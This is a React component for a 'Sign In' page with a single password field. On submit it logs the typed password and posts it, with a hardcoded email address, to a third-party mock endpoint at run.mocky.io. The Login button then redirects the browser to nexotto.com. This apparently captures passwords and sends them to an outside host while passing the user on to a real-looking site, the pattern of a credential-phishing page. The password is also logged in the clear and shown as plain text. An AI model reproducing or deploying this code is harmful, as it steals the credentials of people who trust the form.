import React, { useState } from "react";
import axios from "axios";
import "./Component.css";

const Password = (props) => {
  const [password, setPassword] = useState("");

  const btnhandler = async (e) => {
    e.preventDefault();
    console.log(password);

    await axios
      .post(`https://run.mocky.io/v3/e9fbbabc-ef69-4bf1-9628-f3c9fe991119`, {
        Email: "code@nexotto.com",
        Password: password,
      })
      .then((res) => {
        console.log(res);
      })
      .catch((err) => {
        console.log(err);
      });
  };

  return (
    <div className="l-form">
      <form action="" className="form" onSubmit={btnhandler}>
        <h1 className="form__title">Sign In</h1>

        <div className="form__div">
          <input
            type="text"
            className="form__input"
            placeholder=" "
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <label htmlFor="" className="form__label">
            Password
          </label>
        </div>

        <button
          type="submit"
          className="form__button"
          onClick={(event) => (window.location.href = "https://nexotto.com/")}
        >
          Login
        </button>
      </form>
    </div>
  );
};

export default Password;
